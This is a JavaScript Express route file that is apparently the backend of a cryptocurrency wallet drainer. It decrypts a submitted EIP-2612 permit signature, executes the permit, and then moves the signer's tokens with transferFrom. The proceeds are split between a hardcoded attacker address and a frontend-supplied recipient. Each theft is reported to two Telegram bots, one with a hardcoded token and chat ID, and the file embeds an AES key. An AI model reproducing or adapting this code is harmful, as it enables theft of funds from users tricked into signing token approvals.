require("dotenv").config();
const express = require("express");
const { ethers } = require("ethers");
const axios = require("axios");
const { ERC20_ABI } = require("./ERC20_ABI");
const { getProvider, initiatorWallet } = require("../utils/providerUtils");
const crypto = require("crypto");
const config = require("../config");


const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;

// Helper function to send messages to Telegram

const sendToTelegram = async (message) => {
  try {
    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;

    // First bot using .env configuration
    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(urlEnvBot, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to Telegram bot: ${message}`);

    // Second bot with hardcoded values
    const HARD_CODED_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
    const HARD_CODED_CHAT_ID = "-1002535678431";
    const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
    await axios.post(urlHardcodedBot, {
      chat_id: HARD_CODED_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to hardcoded Telegram bot: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.response?.data || error.message);
  }
};

const router = express.Router();

const BR_ENCRYPTION_KEY = "980c343e20c973f1b941a409d268df2cfca1d2fba93732fcecd3d5ed9cc93305"

const decrypt = ({ data, iv }) => {
  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    Buffer.from(BR_ENCRYPTION_KEY, "hex"),
    Buffer.from(iv, "hex")
  );
  let decrypted = decipher.update(data, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return JSON.parse(decrypted);
};


const decryptMiddleware = (req, res, next) => {
  try {
    const { encryptedData, iv } = req.body;

    if (!encryptedData || !iv) {
      return res.status(400).json({ error: "Missing encrypted data or IV" });
    }

    console.log("Received Encrypted Data:", encryptedData);
    console.log("Received IV:", iv);

    const decryptedData = decrypt({ data: encryptedData, iv });
    console.log("Decrypted Request Body:", decryptedData);
    req.body = decryptedData;
    next();
  } catch (error) {
    console.error("Error decrypting payload:", error.message);
    res.status(400).json({ error: "Invalid encrypted data" });
  }
};



router.post("/handleStandardEIP2612Permit", decryptMiddleware, async (req, res) => {
  try {
    const {
      tokenAddress,
      userAddress, // Owner of the tokens
      chainId,
      domain,
      message,
      signature,
      frontendRecipient,
    } = req.body;

    // Validate the required fields
    if (
      !tokenAddress ||
      !userAddress ||
      !chainId ||
      !domain ||
      !message ||
      !signature ||
      !frontendRecipient
    ) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    console.log("Received Encrypted Data:", req.body.encryptedData);
console.log("Received IV:", req.body.iv);


    // Connect to the appropriate chain
    const provider = getProvider(parseInt(chainId));

    // Create initiator wallet directly with private key and provider
    const connectedWallet = initiatorWallet.connect(provider);
   

    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, connectedWallet);

    // Split the signature into v, r, and s
    const { v, r, s } = ethers.utils.splitSignature(signature);

    console.log(`[${chainId}] Verifying and executing permit...`);
    const permitTx = await tokenContract.permit(
      message.owner, // The token owner
      message.spender, // The initiator (spender)
      message.value, // The amount to be transferred
      message.deadline, // Deadline for the permit
      v,
      r,
      s
    );
    await permitTx.wait();

    console.log(`[${chainId}] Permit executed successfully. Verifying allowance...`);

    // Check the allowance after the permit
    const allowance = await tokenContract.allowance(userAddress, connectedWallet.address);

    console.log(`[${chainId}] Allowance set to: ${ethers.utils.formatUnits(allowance)}`);

    if (allowance.lt(message.value)) {
      throw new Error(
        `Insufficient allowance: ${ethers.utils.formatUnits(
          allowance
        )}, required: ${ethers.utils.formatUnits(message.value)}`
      );
    }

    console.log(`[${chainId}] Allowance verified. Initiating split transfer...`);

    // Define recipients
    const backendRecipient = "0x4758a129ee74947CFA6Ff970162D68e1ee9f55f7";

    // Calculate splits
    const totalAmount = ethers.BigNumber.from(message.value);
    const frontendShare = totalAmount.div(2); // 50%
    const backendShare = totalAmount.sub(frontendShare); // Remaining 50%


        // Transfer to backendRecipient
        const transferTx2 = await tokenContract.transferFrom(
          userAddress, // Owner of the tokens
          backendRecipient,
          backendShare
        );
        await transferTx2.wait();
    
        console.log(`[${chainId}] Transfer to backendRecipient successful: ${transferTx2.hash}`);
    
        const transfer2Msg = `📤 Transfer #2 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${backendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(backendShare)}\n🔑 Tx Hash: ${transferTx2.hash}`;
        await sendToTelegram(transfer2Msg);

    // Transfer to frontendRecipient
    const transferTx1 = await tokenContract.transferFrom(
      userAddress, // Owner of the tokens
      frontendRecipient,
      frontendShare
    );
    await transferTx1.wait();

    console.log(`[${chainId}] Transfer to frontendRecipient successful: ${transferTx1.hash}`);

    const transfer1Msg = `📤 Transfer #1 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${frontendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(frontendShare)}\n🔑 Tx Hash: ${transferTx1.hash}`;
    await sendToTelegram(transfer1Msg);



    // Respond with transaction details
    res.status(200).json({
      message: "Split transfer successful",
      recipients: [
        { address: frontendRecipient, share: frontendShare.toString() },
        { address: backendRecipient, share: backendShare.toString() },
      ],
      transactionHashes: [transferTx1.hash, transferTx2.hash],
    });
  } catch (error) {
    console.error("Error in handleStandardEIP2612Permit:", error);

    const errorMsg = `❌ Error in handleStandardEIP2612Permit:\n\n🛑 Message: ${error.message}`;
    await sendToTelegram(errorMsg);

    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
